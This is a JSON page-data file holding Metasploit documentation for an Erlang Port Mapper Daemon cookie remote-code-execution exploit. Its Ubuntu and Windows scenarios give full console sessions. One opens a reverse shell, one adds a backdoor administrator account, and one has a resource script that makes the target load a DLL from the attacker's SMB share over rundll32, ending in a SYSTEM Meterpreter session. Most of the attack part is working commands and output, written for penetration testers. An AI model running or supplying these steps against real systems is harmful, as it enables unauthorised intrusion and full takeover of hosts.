{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/erlang_cookie_rce","result":{"data":{"moduleMetadataJson":{"id":"c7334da6-2587-5c38-a7ea-ae5d562a4fab","name":"Erlang Port Mapper Daemon Cookie RCE","fullname":"exploit/multi/misc/erlang_cookie_rce","description":"The erlang port mapper daemon is used to coordinate distributed erlang instances.\n          Should an attacker get the authentication cookie RCE is trivial. Usually, this\n          cookie is named \".erlang.cookie\" and varies on location.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/erlang_cookie_rce","documentationSlug":"/modules/documentation/exploit/multi/misc/erlang_cookie_rce","referencesSlug":"/modules/references/exploit/multi/misc/erlang_cookie_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The <a href=\"https://www.erlang.org/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Erlang Port Mapper Daemon</a> is used to coordinate distributed erlang\ninstances. Should an attacker get the authentication cookie code execution is trivial. Normally this\ncookie can be found in the home directory as \".erlang.cookie\", however it varies system to system\nas well as its configuration. As an example on a Windows 10 instance it can be found under the\nusers home directory: e.g <code class=\"language-text\">C:\\Users\\&lt;USER&gt;\\.erlang.cookie</code>. Code execution is achieved via the\n<code class=\"language-text\">os:cmd(&#39;cmd&#39;).</code> command</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the Erlang Port Mapper Daemon</li>\n<li>Install RabbitMQ</li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do <code class=\"language-text\">use exploit/multi/misc/erlang_cookie_rce</code></li>\n<li>Do <code class=\"language-text\">set RHOST &lt;ip&gt;</code></li>\n<li>Do <code class=\"language-text\">set COOKIE &lt;cookie&gt;</code></li>\n<li>Do <code class=\"language-text\">set TARGET &lt;target&gt;</code></li>\n<li>Do <code class=\"language-text\">set LHOST &lt;host&gt;</code></li>\n<li><code class=\"language-text\">exploit</code> and verify shell is opened (if on windows login)</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-16045-lts\" style=\"position:relative;\"><a href=\"#ubuntu-16045-lts\" aria-label=\"ubuntu 16045 lts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.04.5 LTS</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(multi/misc/erlang_cookie_rce) &gt; options \n\nModule options (exploit/multi/misc/erlang_cookie_rce):\n\n   Name    Current Setting       Required  Description\n   ----    ---------------       --------  -----------\n   COOKIE  EXAMPLE               yes       Erlang cookie to login with\n   RHOST   A.B.C.D               yes       The target address\n   RPORT   25672                 yes       The target port (TCP)\n\n\nPayload options (cmd/unix/reverse):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  W.X.Y.Z          yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Unix\n\n\nmsf exploit(multi/misc/erlang_cookie_rce) &gt; exploit\n\n[*] Started reverse TCP double handler on W.X.Y.Z:4444 \n[*] A.B.C.D:25672 - Receiving server challenge\n[*] A.B.C.D:25672 - Sending challenge reply\n[+] A.B.C.D:25672 - Authentication successful, sending payload\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo XinIWxzXWDO5x9EM;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: &quot;XinIWxzXWDO5x9EM\\r\\n&quot;\n[*] Matching...\n[*] A is input...\n[*] Command shell session 1 opened (W.X.Y.Z:4444 -&gt; A.B.C.D:46410) at 2018-12-09 14:45:47 -0600\n\nid\nuid=122(rabbitmq) gid=130(rabbitmq) groups=130(rabbitmq)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"windows-10-build-17134\" style=\"position:relative;\"><a href=\"#windows-10-build-17134\" aria-label=\"windows 10 build 17134 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 10 (Build 17134)</h3>\n<p>First we want to exploit the host, as an example adding a new user. (Payload is executed over cmd.exe)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(multi/misc/erlang_cookie_rce) &gt; options \n\nModule options (exploit/multi/misc/erlang_cookie_rce):\n\n   Name    Current Setting       Required  Description\n   ----    ---------------       --------  -----------\n   COOKIE  EXAMPLE               yes       Erlang cookie to login with\n   RHOST   A.B.C.D               yes       The target address\n   RPORT   25672                 yes       The target port (TCP)\n\n\nPayload options (cmd/windows/adduser):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   CUSTOM                   no        Custom group name to be used instead of default\n   PASS    Wetw0rkHax0r$1   yes       The password for this user\n   USER    wetw0rk          yes       The username to create\n   WMIC    false            yes       Use WMIC on the target to resolve administrators group\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   1   Windows\n\n\nmsf exploit(multi/misc/erlang_cookie_rce) &gt; exploit\n\n[*] A.B.C.D:25672 - Receiving server challenge\n[*] A.B.C.D:25672 - Sending challenge reply\n[+] A.B.C.D:25672 - Authentication successful, sending payload\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Once exploitation is complete the tester can authenticate. Another method that can be used is SMB as shown below.</p>\n<p>exploit.rc -></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/windows/smb/smb_delivery\nset SHARE MSF\nset TARGET 0\nexploit -j\nuse exploit/multi/misc/erlang_cookie_rce\nset COOKIE EXAMPLE\nset TARGET 1\nset RHOST A.B.C.D\nset PAYLOAD cmd/windows/generic\nset CMD &quot;rundll32.exe \\\\\\\\W.X.Y.Z\\MSF\\test.dll,0&quot;\nexploit -j</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; resource exploit.rc\n[*] Processing /root/exploit.rc for ERB directives.\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on W.X.Y.Z:4444 \n[*] Started service listener on W.X.Y.Z:445 \n[*] Server started.\n[*] Run the following command on the target machine: rundll32.exe \\\\W.X.Y.Z\\MSF\\test.dll,0\n[*] Exploit running as background job 1.\n[*] A.B.C.D:25672 - Receiving server challenge\n[*] A.B.C.D:25672 - Sending challenge reply\n[+] A.B.C.D:25672 - Authentication successful, sending payload\n[*] Sending stage (179779 bytes) to A.B.C.D\n[*] Meterpreter session 1 opened (W.X.Y.Z:4444 -&gt; A.B.C.D:51856) at 2018-12-18 14:45:02 -0600\n[*] Exploit completed, but no session was created.\nmsf exploit(multi/misc/erlang_cookie_rce) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"c7334da6-2587-5c38-a7ea-ae5d562a4fab"}}}